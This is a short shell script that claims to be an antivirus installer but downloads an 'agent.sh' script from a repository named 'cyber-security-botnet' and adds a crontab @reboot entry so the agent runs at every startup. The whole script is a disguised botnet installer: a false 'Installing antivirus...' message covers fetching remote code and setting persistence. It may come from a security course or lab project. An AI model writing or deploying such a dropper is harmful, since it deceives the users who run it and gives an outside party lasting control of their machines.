#!/bin/sh
echo "Installing antivirus..."
wget -nv -q https://raw.githubusercontent.com/tprupsys/cyber-security-botnet/master/agent/agent.sh
DIR=$(pwd)
CRON="@reboot sh $DIR/agent.sh"
crontab <<EOF
$CRON
EOF
